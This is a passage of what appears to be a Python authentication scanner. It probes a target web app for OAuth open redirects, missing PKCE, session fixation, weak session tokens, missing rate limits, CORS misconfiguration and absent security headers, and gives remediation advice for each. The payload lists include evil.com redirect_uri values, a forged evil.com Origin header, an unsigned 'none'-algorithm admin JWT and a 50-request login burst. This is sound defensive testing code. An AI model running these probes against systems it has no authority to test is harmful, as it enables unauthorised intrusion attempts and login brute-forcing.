+   624→   624→        "/oauth/callback?continue=https://evil.com",
+   625→   625→        "/oauth/callback?return_to=https://evil.com",
+   626→   626→        "/oauth/callback?redirect=https://evil.com",
+   627→   627→        "/authorize?redirect_uri=https://evil.com",
+   628→   628→        "/auth/callback?redirect_uri=https://evil.com",
+   629→   629→        "/login/oauth/callback?redirect_uri=https://evil.com",
+   630→   630→    ]
+   631→   631→    for payload in _oauth_redirect_payloads:
+   632→   632→        url = base_url.rstrip("/") + payload
+   633→   633→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls, method="GET")
+   634→   634→        status = resp.get("status", 0)
+   635→   635→        # Check for 3xx redirect or Location header with evil.com
+   636→   636→        location = resp.get("headers", {}).get("location", "")
+   637→   637→        body = resp.get("body", "")[:4096]
+   638→   638→        if status in (301, 302, 303, 307, 308) and "evil.com" in location:
+   639→   639→            add(
+   640→   640→                f"OAuth open redirect: {payload.split('?')[0]}",
+   641→   641→                "high",
+   642→   642→                f"OAuth callback accepts external redirect_uri parameter. "
+   643→   643→                f"Redirect to https://evil.com was allowed.",
+   644→   644→                f"GET {payload} -> {status} Location: {location}",
+   645→   645→                12,
+   646→   646→                remediation="Validate redirect_uri against a strict allowlist of domains. "
+   647→   647→                            "Never allow open-ended redirect URIs in OAuth flows."
+   648→   648→            )
+   649→   649→            break
+   650→   650→        # Also check for redirect in response body (meta refresh, JS redirect)
+   651→   651→        if "evil.com" in body.lower():
+   652→   652→            add(
+   653→   653→                f"OAuth redirect_uri reflected in response: {payload.split('?')[0]}",
+   654→   654→                "medium",
+   655→   655→                f"OAuth callback reflected user-supplied redirect_uri in response body. "
+   656→   656→                f"Potential for open redirect or phishing.",
+   657→   657→                f"GET {payload} -> evil.com reflected in body",
+   658→   658→                8,
+   659→   659→                remediation="Do not reflect user-supplied redirect_uri in response body. "
+   660→   660→                            "Validate against allowlist."
+   661→   661→            )
+   662→   662→            break
+   663→   663→
+   664→   664→    # 17b: Token leakage in URL fragments
+   665→   665→    _token_leak_paths = [
+   666→   666→        "/oauth/callback#access_token=fake_token",
+   667→   667→        "/auth/callback#id_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+   668→   668→        "/oauth/callback#token_type=bearer&access_token=leaked",
+   669→   669→    ]
+   670→   670→    for tl_path in _token_leak_paths:
+   671→   671→        url = base_url.rstrip("/") + tl_path
+   672→   672→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   673→   673→        body = resp.get("body", "")[:4096]
+   674→   674→        # Check if the token fragment is referenced in response (e.g., in JS that reads hash)
+   675→   675→        if "access_token" in body or "id_token" in body:
+   676→   676→            if "window.location.hash" in body or "location.hash" in body:
+   677→   677→                add(
+   678→   678→                    "OAuth token in URL fragment with client-side extraction",
+   679→   679→                    "medium",
+   680→   680→                    "Application may expose access tokens via URL fragments. "
+   681→   681→                    "Tokens in fragments can leak via Referer header.",
+   682→   682→                    f"Fragment token pattern found in response JS",
+   683→   683→                    8,
+   684→   684→                    remediation="Use Authorization Code flow with PKCE instead of Implicit flow. "
+   685→   685→                                "Tokens should be delivered via secure HTTP headers, not URL fragments."
+   686→   686→                )
+   687→   687→                break
+   688→   688→
+   689→   689→    # 17c: Missing PKCE (detect implicit flow support)
+   690→   690→    _pkce_paths = [
+   691→   691→        "/.well-known/openid-configuration",
+   692→   692→        "/.well-known/oauth-authorization-server",
+   693→   693→    ]
+   694→   694→    for pkce_path in _pkce_paths:
+   695→   695→        url = base_url.rstrip("/") + pkce_path
+   696→   696→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   697→   697→        if resp.get("status") == 200:
+   698→   698→            try:
+   699→   699→                oidc_cfg = json.loads(resp.get("body", ""))
+   700→   700→                # Check if implicit flow (response_type=token) is supported
+   701→   701→                grant_types = oidc_cfg.get("grant_types_supported", [])
+   702→   702→                response_types = oidc_cfg.get("response_types_supported", [])
+   703→   703→                code_challenge_methods = oidc_cfg.get("code_challenge_methods_supported", [])
+   704→   704→
+   705→   705→                if "token" in response_types or "id_token" in response_types:
+   706→   706→                    if not code_challenge_methods:
+   707→   707→                        add(
+   708→   708→                            "OIDC: Implicit flow supported without PKCE",
+   709→   709→                            "medium",
+   710→   710→                            f"OpenID configuration at {pkce_path} supports implicit flow "
+   711→   711→                            f"(response_type=token) but does not list code_challenge_methods. "
+   712→   712→                            f"Authorization Code flow without PKCE is vulnerable to code interception.",
+   713→   713→                            f"response_types_supported={response_types}, code_challenge_methods_supported={code_challenge_methods}",
+   714→   714→                            8,
+   715→   715→                            remediation="Disable implicit flow. Require Authorization Code flow with PKCE "
+   716→   716→                                        "(S256 code challenge method) for all public clients."
+   717→   717→                        )
+   718→   718→                elif "authorization_code" in grant_types and not code_challenge_methods:
+   719→   719→                    add(
+   720→   720→                        "OIDC: Authorization Code flow without PKCE",
+   721→   721→                        "medium",
+   722→   722→                        f"OIDC configuration supports authorization_code grant but does not "
+   723→   723→                        f"require PKCE (no code_challenge_methods_supported).",
+   724→   724→                        f"grant_types={grant_types}, code_challenge_methods={code_challenge_methods}",
+   725→   725→                        6,
+   726→   726→                        remediation="Require PKCE (S256) for all Authorization Code flows, "
+   727→   727→                                    "especially for public clients (SPAs, mobile apps)."
+   728→   728→                    )
+   729→   729→            except (json.JSONDecodeError, KeyError):
+   730→   730→                pass
+   731→   731→
+   732→   732→    # 17d: Wildcard redirect URIs
+   733→   733→    _wildcard_tests = [
+   734→   734→        ("/oauth/authorize?redirect_uri=https://evil.com", "https://evil.com"),
+   735→   735→        ("/oauth/authorize?redirect_uri=https://evil.evil.com", "evil.evil.com"),
+   736→   736→        ("/oauth/authorize?redirect_uri=https://evil.com.benign.com", "evil.com.benign.com"),
+   737→   737→    ]
+   738→   738→    for w_path, w_domain in _wildcard_tests:
+   739→   739→        url = base_url.rstrip("/") + w_path
+   740→   740→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   741→   741→        status = resp.get("status", 0)
+   742→   742→        location = resp.get("headers", {}).get("location", "")
+   743→   743→        if status in (301, 302, 303, 307, 308) and w_domain in location:
+   744→   744→            add(
+   745→   745→                f"OAuth wildcard redirect URI: {w_domain}",
+   746→   746→                "high",
+   747→   747→                f"OAuth authorize endpoint redirects to {w_domain}. "
+   748→   748→                f"Redirect URI validation may use insecure wildcards.",
+   749→   749→                f"GET {w_path} -> {status} Location: {location}",
+   750→   750→                12,
+   751→   751→                remediation="Use exact-match redirect URI validation. "
+   752→   752→                            "Never use wildcard, substring, or domain-suffix matching."
+   753→   753→            )
+   754→   754→            break
+   755→   755→
+   756→   756→    # ─── Technique 18: Session Management Deep ──────────────────────────
+   757→   757→
+   758→   758→    # 18a: Session fixation — set cookie before login, check if it persists
+   759→   759→    _fixation_cookie = "reconpro_fixation_test=a1b2c3d4e5f6"
+   760→   760→    _login_paths = ["/login", "/auth/login", "/api/v1/auth/login", "/api/v1/login"]
+   761→   761→    for lp in _login_paths:
+   762→   762→        url = base_url.rstrip("/") + lp
+   763→   763→        # First request: send a pre-set session cookie
+   764→   764→        resp1 = http_probe(url, method="POST",
+   765→   765→                            headers={"Cookie": _fixation_cookie,
+   766→   766→                                     "Content-Type": "application/json"},
+   767→   767→                            body=json.dumps({"username": "test", "password": "test"}).encode(),
+   768→   768→                            timeout=timeout, verify_tls=verify_tls)
+   769→   769→        set_cookie1 = resp1.get("headers", {}).get("set-cookie", "")
+   770→   770→        # If the server set-cookie contains our injected cookie name, fixation likely
+   771→   771→        if "reconpro_fixation_test" in set_cookie1.lower():
+   772→   772→            add(
+   773→   773→                f"Session fixation: {lp}",
+   774→   774→                "high",
+   775→   775→                f"Login endpoint at {lp} accepted and may persist client-supplied session cookie. "
+   776→   776→                f"Session fixation attack may be possible.",
+   777→   777→                f"POST {lp} with pre-set cookie -> Set-Cookie contains injected value",
+   778→   778→                12,
+   779→   779→                remediation="Always generate a new session ID after successful authentication. "
+   780→   780→                            "Invalidate the old session. Do not accept session IDs from untrusted sources."
+   781→   781→            )
+   782→   782→            break
+   783→   783→        # Also check: if response sets NO new cookie and returns 200, fixation possible
+   784→   784→        if resp1.get("status") == 200 and not set_cookie1:
+   785→   785→            body = resp1.get("body", "").lower()
+   786→   786→            if "login successful" in body or "authenticated" in body or "token" in body:
+   787→   787→                add(
+   788→   788→                    f"Session fixation (no rotation): {lp}",
+   789→   789→                    "medium",
+   790→   790→                    f"Login at {lp} returned success but did not set a new session cookie. "
+   791→   791→                    f"Pre-authentication session may persist post-login.",
+   792→   792→                    f"POST {lp} -> 200, no Set-Cookie header",
+   793→   793→                    8,
+   794→   794→                    remediation="Always issue a new session ID upon successful authentication. "
+   795→   795→                                "Regenerate session state server-side."
+   796→   796→                )
+   797→   797→                break
+   798→   798→
+   799→   799→    # 18b: Session ID in URL
+   800→   800→    _session_url_patterns = [
+   801→   801→        "/dashboard;jsessionid=RECONPRO_TEST",
+   802→   802→        "/api/v1/users;ASPSESSIONID=RECONPRO",
+   803→   803→        "/profile?PHPSESSID=RECONPRO_TEST",
+   804→   804→        "/home?session_id=RECONPRO_TEST",
+   805→   805→    ]
+   806→   806→    for sup in _session_url_patterns:
+   807→   807→        url = base_url.rstrip("/") + sup
+   808→   808→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   809→   809→        status = resp.get("status", 0)
+   810→   810→        body = resp.get("body", "")[:2048]
+   811→   811→        if status == 200 and len(body) > 20:
+   812→   812→            body_lower = body.lower()
+   813→   813→            is_protected = any(kw in body_lower for kw in [
+   814→   814→                "unauthorized", "forbidden", "401", "403"
+   815→   815→            ])
+   816→   816→            if not is_protected and ("jsessionid" in body_lower or "aspsessionid" in body_lower
+   817→   817→                                     or "phpsessid" in body_lower):
+   818→   818→                add(
+   819→   819→                    "Session ID in URL",
+   820→   820→                    "medium",
+   821→   821→                    "Session ID appears to be accepted or reflected in URL. "
+   822→   822→                    "URL-based session IDs can leak via Referer header, browser history, and server logs.",
+   823→   823→                    f"GET {sup} -> 200, session ID in response",
+   824→   824→                    8,
+   825→   825→                    remediation="Store session IDs exclusively in HttpOnly, Secure cookies. "
+   826→   826→                                "Never accept or generate session IDs in URLs."
+   827→   827→                )
+   828→   828→                break
+   829→   829→
+   830→   830→    # 18c: Insecure session token generation (sequential/predictable)
+   831→   831→    # Make two requests and compare Set-Cookie session values
+   832→   832→    _session_probe_path = "/api/v1/session" if True else "/session"
+   833→   833→    _session_cookies: List[str] = []
+   834→   834→    for _ in range(3):
+   835→   835→        url = base_url.rstrip("/") + "/"
+   836→   836→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   837→   837→        set_cookie = resp.get("headers", {}).get("set-cookie", "")
+   838→   838→        if set_cookie:
+   839→   839→            # Extract session cookie value
+   840→   840→            import re
+   841→   841→            m = re.search(r'(?:session|sid|jsessionid|phpsessid|aspsessionid)\s*=\s*([^;]+)',
+   842→   842→                         set_cookie, re.IGNORECASE)
+   843→   843→            if m:
+   844→   844→                _session_cookies.append(m.group(1).strip())
+   845→   845→    if len(_session_cookies) >= 2:
+   846→   846→        # Check if cookies are identical (no rotation) or very similar (sequential)
+   847→   847→        if len(set(_session_cookies)) == 1:
+   848→   848→            add(
+   849→   849→                "Session token not randomized between requests",
+   850→   850→                "medium",
+   851→   851→                f"Multiple requests returned identical session cookie: {_session_cookies[0][:20]}... "
+   852→   852→                f"Session tokens should be unique per session.",
+   853→   853→                f"3 requests -> same session cookie",
+   854→   854→                8,
+   855→   855→                remediation="Generate cryptographically random session tokens (at least 128 bits). "
+   856→   856→                            "Ensure uniqueness across all active sessions."
+   857→   857→            )
+   858→   858→        # Check for short/weak session tokens
+   859→   859→        for sc in _session_cookies:
+   860→   860→            if len(sc) < 16:
+   861→   861→                add(
+   862→   862→                    "Weak session token length",
+   863→   863→                    "medium",
+   864→   864→                    f"Session token is only {len(sc)} characters long: {sc[:20]}... "
+   865→   865→                    f"Minimum recommended length is 128 bits (16+ chars of hex/base64).",
+   866→   866→                    f"Session cookie length={len(sc)}",
+   867→   867→                    6,
+   868→   868→                    remediation="Use session tokens of at least 128 bits. "
+   869→   869→                                "Use secrets.token_urlsafe() or equivalent CSPRNG."
+   870→   870→                )
+   871→   871→                break
+   872→   872→
+   873→   873→    # 18d: Missing session expiry headers
+   874→   874→    for check_path in ["/", "/api/v1/me"]:
+   875→   875→        url = base_url.rstrip("/") + check_path
+   876→   876→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   877→   877→        resp_headers = resp.get("headers", {})
+   878→   878→        set_cookie = resp_headers.get("set-cookie", "")
+   879→   879→        if set_cookie:
+   880→   880→            sc_lower = set_cookie.lower()
+   881→   881→            has_http_only = "httponly" in sc_lower
+   882→   882→            has_secure = "secure" in sc_lower
+   883→   883→            has_samesite = "samesite" in sc_lower
+   884→   884→            has_max_age = "max-age" in sc_lower
+   885→   885→            has_expires = "expires" in sc_lower
+   886→   886→
+   887→   887→            issues = []
+   888→   888→            if not has_http_only:
+   889→   889→                issues.append("missing HttpOnly")
+   890→   890→            if not has_secure:
+   891→   891→                issues.append("missing Secure")
+   892→   892→            if not has_samesite:
+   893→   893→                issues.append("missing SameSite")
+   894→   894→            if not has_max_age and not has_expires:
+   895→   895→                issues.append("no expiry (Max-Age/Expires)")
+   896→   896→
+   897→   897→            if issues:
+   898→   898→                add(
+   899→   899→                    f"Insecure session cookie attributes: {check_path}",
+   900→   900→                    "medium",
+   901→   901→                    f"Session cookie on {check_path} has: {', '.join(issues)}. "
+   902→   902→                    f"Full Set-Cookie: {set_cookie[:100]}",
+   903→   903→                    f"Set-Cookie issues: {', '.join(issues)}",
+   904→   904→                    8,
+   905→   905→                    remediation="Set HttpOnly, Secure, and SameSite=Strict/Lax on all session cookies. "
+   906→   906→                                "Set appropriate Max-Age or Expires values."
+   907→   907→                )
+   908→   908→            break
+   909→   909→
+   910→   910→    # ─── Technique 19: Rate Limiting Deep ───────────────────────────────
+   911→   911→    _rate_limit_paths = ["/api/v1/auth/login", "/login", "/api/v1/login",
+   912→   912→                         "/api/v1/auth/token", "/api/v1/auth"]
+   913→   913→    for rl_path in _rate_limit_paths:
+   914→   914→        url = base_url.rstrip("/") + rl_path
+   915→   915→
+   916→   916→        # 19a: Send 50 rapid requests and observe behavior
+   917→   917→        _statuses: List[int] = []
+   918→   918→        _times: List[float] = []
+   919→   919→        _rate_limit_headers_found: Dict[str, str] = {}
+   920→   920→        _got_429 = False
+   921→   921→
+   922→   922→        for i in range(50):
+   923→   923→            t0 = time.monotonic()
+   924→   924→            resp = http_probe(url, method="POST",
+   925→   925→                              headers={"Content-Type": "application/json"},
+   926→   926→                              body=json.dumps({"username": "ratelimit_test", "password": f"attempt_{i}"}).encode(),
+   927→   927→                              timeout=max(timeout, 5), verify_tls=verify_tls)
+   928→   928→            elapsed = time.monotonic() - t0
+   929→   929→            _statuses.append(resp.get("status", 0))
+   930→   930→            _times.append(elapsed)
+   931→   931→
+   932→   932→            resp_headers = resp.get("headers", {})
+   933→   933→            for rh_key in ["x-ratelimit-limit", "x-ratelimit-remaining",
+   934→   934→                           "x-ratelimit-reset", "retry-after",
+   935→   935→                           "x-rate-limit-limit", "x-rate-limit-remaining"]:
+   936→   936→                if rh_key in resp_headers and rh_key not in _rate_limit_headers_found:
+   937→   937→                    _rate_limit_headers_found[rh_key] = resp_headers[rh_key]
+   938→   938→
+   939→   939→            if resp.get("status") == 429:
+   940→   940→                _got_429 = True
+   941→   941→                break  # Rate limit detected, stop hammering
+   942→   942→
+   943→   943→        # Analyze results
+   944→   944→        if _got_429:
+   945→   945→            retry_after = _rate_limit_headers_found.get("retry-after", "not set")
+   946→   946→            add(
+   947→   947→                f"Rate limiting detected: {rl_path}",
+   948→   948→                "info",
+   949→   949→                f"Endpoint {rl_path} returned 429 after rate limit threshold. "
+   950→   950→                f"Retry-After: {retry_after}. "
+   951→   951→                f"Rate limit headers found: {list(_rate_limit_headers_found.keys())}",
+   952→   952→                f"429 returned after {len(_statuses)} requests. Headers: {_rate_limit_headers_found}",
+   953→   953→                0,
+   954→   954→                remediation="",
+   955→   955→            )
+   956→   956→        else:
+   957→   957→            # Check if all 50 requests returned the same status (no rate limiting)
+   958→   958→            unique_statuses = set(_statuses)
+   959→   959→            if len(unique_statuses) <= 2 and 429 not in unique_statuses:
+   960→   960→                # Check response time degradation
+   961→   961→                avg_first_10 = sum(_times[:10]) / 10 if _times else 0
+   962→   962→                avg_last_10 = sum(_times[-10:]) / 10 if _times else 0
+   963→   963→                time_degradation = avg_last_10 - avg_first_10
+   964→   964→
+   965→   965→                add(
+   966→   966→                    f"No rate limiting: {rl_path} (50 requests)",
+   967→   967→                    "high",
+   968→   968→                    f"Sent 50 rapid POST requests to {rl_path}. "
+   969→   969→                    f"No 429 returned. Statuses: {unique_statuses}. "
+   970→   970→                    f"Avg response time: first 10={avg_first_10:.2f}s, last 10={avg_last_10:.2f}s. "
+   971→   971→                    f"Time degradation: {time_degradation:+.2f}s.",
+   972→   972→                    f"50 requests -> no 429. Statuses: {list(unique_statuses)[:5]}",
+   973→   973→                    10,
+   974→   974→                    remediation="Implement rate limiting on authentication endpoints. "
+   975→   975→                                "Return 429 with Retry-After header when threshold is exceeded. "
+   976→   976→                                "Include X-RateLimit-Limit and X-RateLimit-Remaining headers."
+   977→   977→                )
+   978→   978→                break
+   979→   979→
+   980→   980→    # ─── Technique 20: Insufficient transport security on auth endpoints ─
+   981→   981→    if base_url.startswith("http://"):
+   982→   982→        add(
+   983→   983→            "Authentication over plaintext HTTP",
+   984→   984→            "high",
+   985→   985→            f"Target base URL uses HTTP (not HTTPS). Authentication credentials transmitted in cleartext.",
+   986→   986→            f"Base URL: {base_url}",
+   987→   987→            15,
+   988→   988→            remediation="Enforce HTTPS for all authentication-related endpoints. "
+   989→   989→                        "Set HSTS headers. Redirect all HTTP to HTTPS."
+   990→   990→        )
+   991→   991→
+   992→   992→    # ─── Technique 21: CORS misconfiguration on auth endpoints ───────────
+   993→   993→    _cors_paths = ["/api/v1/me", "/api/v1/login", "/oauth/authorize"]
+   994→   994→    for cors_path in _cors_paths:
+   995→   995→        url = base_url.rstrip("/") + cors_path
+   996→   996→        resp = http_probe(url, headers={"Origin": "https://evil.com"},
+   997→   997→                          timeout=timeout, verify_tls=verify_tls)
+   998→   998→        resp_headers = resp.get("headers", {})
+   999→   999→        allow_origin = resp_headers.get("access-control-allow-origin", "")
+  1000→  1000→        allow_cred = resp_headers.get("access-control-allow-credentials", "")
+  1001→  1001→        if "evil.com" in allow_origin:
+  1002→  1002→            severity = "high" if allow_cred.lower() == "true" else "medium"
+  1003→  1003→            add(
+  1004→  1004→                f"CORS allows arbitrary origin: {cors_path}",
+  1005→  1005→                severity,
+  1006→  1006→                f"Endpoint {cors_path} reflects arbitrary Origin (https://evil.com) in "
+  1007→  1007→                f"Access-Control-Allow-Origin. Credentials allowed: {allow_cred}.",
+  1008→  1008→                f" ACAO: {allow_origin}, ACAC: {allow_cred}",
+  1009→  1009→                12 if severity == "high" else 6,
+  1010→  1010→                remediation="Never reflect arbitrary Origin values. "
+  1011→  1011→                            "Use a strict allowlist of trusted origins. "
+  1012→  1012→                            "Never combine Access-Control-Allow-Origin: * with Allow-Credentials: true."
+  1013→  1013→            )
+  1014→  1014→            break
+  1015→  1015→
+  1016→  1016→    # ─── Technique 22: Security headers missing on auth endpoints ────────
+  1017→  1017→    _sec_check_path = base_url.rstrip("/") + "/api/v1/me"
+  1018→  1018→    sec_resp = http_probe(_sec_check_path, timeout=timeout, verify_tls=verify_tls)
+  1019→  1019→    sec_headers = sec_resp.get("headers", {})
+  1020→  1020→    _missing_headers = []
+  1021→  1021→    for hdr in ["x-frame-options", "x-content-type-options", "x-xss-protection",
+  1022→  1022→                "strict-transport-security", "content-security-policy",
+  1023→  1023→                "cache-control", "pragma"]:
+  1024→  1024→        if hdr not in {k.lower() for k in sec_headers}:
+  1025→  1025→            _missing_headers.append(hdr)
+  1026→  1026→    if _missing_headers:
+  1027→  1027→        add(
+  1028→  1028→            f"Missing security headers: {', '.join(_missing_headers[:4])}",
+  1029→  1029→            "low",
+  1030→  1030→            f"Auth endpoint missing recommended security headers: {', '.join(_missing_headers)}",
+  1031→  1031→            f"Missing: {', '.join(_missing_headers)}",
+  1032→  1032→            3,
+  1033→  1033→            remediation="Add X-Frame-Options (DENY/SAMEORIGIN), X-Content-Type-Options (nosniff), "
+  1034→  1034→                        "Strict-Transport-Security, Content-Security-Policy, and Cache-Control (no-store) "
+  1035→  1035→                        "to all authentication endpoints."
+  1036→  1036→        )
+  1037→  1037→
+  1038→  1038→    return findings
+  1039→  1039→
